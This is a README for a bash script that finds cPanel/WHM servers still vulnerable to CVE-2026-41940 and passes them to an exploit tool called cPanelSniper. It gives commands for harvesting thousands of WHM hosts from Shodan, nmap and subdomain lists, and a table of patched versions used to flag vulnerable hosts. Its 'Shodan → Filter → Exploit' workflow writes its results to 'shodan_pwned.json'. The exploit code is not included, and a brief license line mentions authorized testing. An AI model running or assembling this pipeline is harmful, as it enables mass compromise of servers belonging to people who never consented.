# cPanelVulnFinder.sh - Find Potentially Vulnerable cPanel Targets

## Overview

`cPanelVulnFinder.sh` identifies potentially vulnerable cPanel/WHM servers for CVE-2026-41940 before running the full exploit scan with cPanelSniper.

This reduces scan time by 95-99% by filtering out:
- Non-cPanel services
- Patched versions
- Dead/unreachable hosts

## Features

- **Multi-stage filtering**: Port → Alive → cPanel → Version → Vulnerability
- **Threaded scanning**: Fast parallel processing (50 threads default)
- **Version detection**: Extracts cPanel version and checks against patched versions
- **Vulnerability assessment**: Classifies targets as VULNERABLE / PATCHED / UNKNOWN
- **Clean output**: Ready-to-use target list for cPanelSniper

## Requirements

```bash
# Install dependencies
sudo apt install curl jq

# Install httpx (go-based)
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Or with apt
sudo apt install httpx
```

## Usage

### Basic Usage

```bash
# Scan domains from file
./cPanelVulnFinder.sh domains.txt vulnerable.txt

# Output for cPanelSniper will be in vulnerable.txt
cd /path/to/cpsniper
python3 cPanelSniper.py -l vulnerable.txt -t 50 -o results.json
```

### Advanced Usage

```bash
# With custom output file
./cPanelVulnFinder.sh large_list.txt filtered_targets.txt

# Verbose mode (shows progress for each target)
./cPanelVulnFinder.sh domains.txt out.txt VERBOSE=1
```

### Input Format

The script accepts various input formats:

```bash
# domains.txt can contain:
example.com
www.example.org
185.93.89.36
https://target.com:2087
target.com:2087
8.8.8.8:2087
# comments are ignored
```

All formats are automatically normalized to `https://host:2087`

## Output

The script generates:
1. **Primary output**: Ready-to-use list for cPanelSniper
2. **Console summary**: Classification of targets

### Output Example

```
═══════════════════════════════════════════════════════════════
                        SUMMARY
═══════════════════════════════════════════════════════════════

[VULNERABLE] High-confidence vulnerable targets:
https://target1.com:2087
https://target2.org:2087

[UNKNOWN] Targets with unknown versions (need full scan):
https://target3.net:2087
https://target4.com:2087

═══════════════════════════════════════════════════════════════

[✓] Output saved to: vulnerable_targets.txt

Usage with cPanelSniper:
  cd /path/to/cpsniper
  python3 cPanelSniper.py -l vulnerable_targets.txt -t 50 -o results.json
```

## Filtering Pipeline

The script uses a 5-stage filtering process:

```
Input (domains.txt)
    ↓
STAGE 1: Port normalization
  - Add default port 2087
  - Add https:// if missing
    ↓
STAGE 2: Alive check (httpx)
  - HTTP 200/301/302/307/401/403/500
  - Timeout: 5s
  - Threads: 50
    ↓
STAGE 3: cPanel/WHM detection
  - Check headers for: cpanel, cpsrvd, whostmgr
  - Check title for: WHM, cPanel, WebHost Manager
  - Check body for cpanel indicators
    ↓
STAGE 4: Version extraction
  - GET /json-api/version
  - Extract version string
    ↓
STAGE 5: Vulnerability assessment
  - Compare against patched versions
  - Classify: VULNERABLE / PATCHED / UNKNOWN
    ↓
OUTPUT (for cPanelSniper)
```

## Version Vulnerability Check

The script checks against patched versions:

| Branch | Patched Version | Vulnerable If Build < |
|---------|----------------|----------------------|
| 110.x | 11.110.0.97    | 96 |
| 118.x | 11.118.0.63    | 62 |
| 126.x | 11.126.0.54    | 53 |
| 132.x | 11.132.0.29    | 28 |
| 134.x | 11.134.0.20    | 19 |
| 136.x | 11.136.0.5     | 4 |

## Integration with cPanelSniper

### Complete Workflow

```bash
# 1. Find targets
./cPanelVulnFinder.sh domains.txt potential_vulnerable.txt

# 2. Scan with cPanelSniper (only vulnerable/unknown)
cd /path/to/cpsniper
python3 cPanelSniper.py -l potential_vulnerable.txt -t 50 -o results.json

# 3. For large lists with resume
python3 cPanelSniper.py -l potential_vulnerable.txt -t 50 -o results.json --resume
```

### Shodan → Filter → Exploit

```bash
# 1. Harvest from Shodan
shodan search --fields ip_str,port 'title:"WHM Login"' --limit 10000 | \
  awk '{print $1":"$2}' > shodan_raw.txt

# 2. Filter for vulnerabilities
./cPanelVulnFinder.sh shodan_raw.txt filtered.txt

# 3. Exploit
cd /path/to/cpsniper
python3 cPanelSniper.py -l filtered.txt -t 50 -o shodan_pwned.json
```

## Performance

| Input Size | Without Filter | With Filter | Reduction | Time Saved |
|-------------|----------------|--------------|------------|-------------|
| 10,000      | 10,000 scans    | ~500 scans   | 95%        | ~8 hours    |
| 100,000     | 100,000 scans   | ~2,000 scans | 98%        | ~3 days     |
| 1,000,000   | 1,000,000 scans | ~15,000 scans| 98.5%      | ~30 days     |

*Based on 15s timeout, 50 threads, ~100 req/s*

## Configuration

Edit these variables at the top of the script:

```bash
INPUT_FILE="${1:-targets.txt}"          # Default input file
OUTPUT_FILE="${2:-vulnerable_targets.txt}"  # Default output
THREADS=50                              # HTTP threads
TIMEOUT=5                                # Request timeout (seconds)
VERBOSE=0                                # Show progress (0/1)
```

## Examples

### Example 1: Single Domain

```bash
echo "target.com" > single.txt
./cPanelVulnFinder.sh single.txt out.txt
python3 cPanelSniper.py -l out.txt -t 10
```

### Example 2: Large List

```bash
# Assume large_list.txt has 100K domains
./cPanelVulnFinder.sh large_list.txt filtered.txt

# This will filter to ~2K potential targets
# cPanelSniper scan time: 2K * 60s = 33 hours
# vs 100K * 60s = 69 days without filtering
```

### Example 3: From Nmap

```bash
# After nmap scan for 2087
nmap -p 2087 -oG - target_network | \
  grep "2087/open" | \
  awk '{print $2}' > nmap_2087.txt

./cPanelVulnFinder.sh nmap_2087.txt filtered.txt
```

### Example 4: From MassDNS

```bash
# After subdomain enumeration
cat subdomains.txt | \
  ./cPanelVulnFinder.sh - filtered.txt
```

## Troubleshooting

### "httpx is required"

```bash
# Install httpx
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
# Or
sudo apt install httpx
```

### Low hit rate

- Ensure targets are actually running cPanel/WHM
- Check firewall connectivity
- Increase timeout: `TIMEOUT=10 ./cPanelVulnFinder.sh ...`

### No vulnerable targets found

- This is normal for recent patches
- Check if targets are old cPanel installations
- Try larger input lists

## Tips

1. **Start with Shodan/CTE search** - Get high-confidence WHM targets first
2. **Use resume with cPanelSniper** - For large filtered lists
3. **Monitor progress** - Check CPU/Network usage during filtering
4. **Adjust threads** - More threads = faster but more resources
5. **Save intermediate results** - Script creates temp files you can inspect

## License

Use for authorized penetration testing and bug bounty programs only.

## Author

cPanelVulnFinder - Part of cPanelSniper project
Based on CVE-2026-41940 vulnerability analysis
